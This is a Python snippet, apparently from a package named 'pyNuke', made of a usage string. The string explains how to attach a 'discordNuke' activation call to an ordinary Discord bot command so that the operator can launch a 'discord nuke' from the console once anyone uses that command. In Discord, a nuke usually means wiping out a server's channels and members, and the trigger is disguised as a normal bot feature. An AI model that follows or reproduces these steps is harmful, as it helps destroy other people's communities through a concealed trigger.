__how__ = "First, import pyNuke using `import pyNuke` and import discordNuke using `from pyNuke import discordNuke`.                                                        Make a command using, for example, @bot.tree.command().                                                                                                           At the end of the command, add the following function call: await discordNuke.nukeactivate(interaction=interaction, bot=bot).                                     Now, everytime someone uses that command, you will be able to use the discord nuke on the console."
